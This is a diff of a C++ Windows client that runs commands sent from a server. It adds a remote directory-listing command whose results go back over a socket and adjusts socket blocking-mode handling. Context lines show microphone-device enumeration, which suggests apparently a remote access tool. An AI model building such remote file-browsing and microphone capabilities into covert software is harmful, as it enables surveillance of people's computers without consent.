@@ -165,6 +165,18 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
 
     }
 
+    //Lista directorio
+    if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Dir_Folder){
+        for (auto item : vDir(strIn[1].c_str())) {
+            std::string strCommand = std::to_string(EnumComandos::FM_Dir_Folder);
+            strCommand.append(1, '\\');
+            strCommand.append(item);
+            this->cSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true);
+            Sleep(10);
+            std::cout << strCommand << std::endl;
+        }
+    }
+
     //Lista de dispositivos de entrada (mic)
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Refre_Dispositivos) {
 #ifdef ___DEBUG_
@@ -288,11 +300,13 @@ int Cliente::cSend(SOCKET& pSocket, const char* pBuffer, int pLen, int pFlags, b
         lock.unlock();
         
         //Restaurar
-        iBlock = 1;
-        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
+        if (!this->BLOCK_MODE) {
+            iBlock = 1;
+            if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
 #ifdef ___DEBUG_
-            error();
+                error();
 #endif
+            }
         }
         
     } else {
@@ -349,11 +363,13 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
         }
 
         //Restaurar
-        iBlock = 1;
-        if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
+        if (!this->BLOCK_MODE) {
+            iBlock = 1;
+            if (ioctlsocket(pSocket, FIONBIO, &iBlock) != 0) {
 #ifdef ___DEBUG_
-            error();
+                error();
 #endif
+            }
         }
         if (cTmpBuff) {
             ZeroMemory(cTmpBuff, pLen);
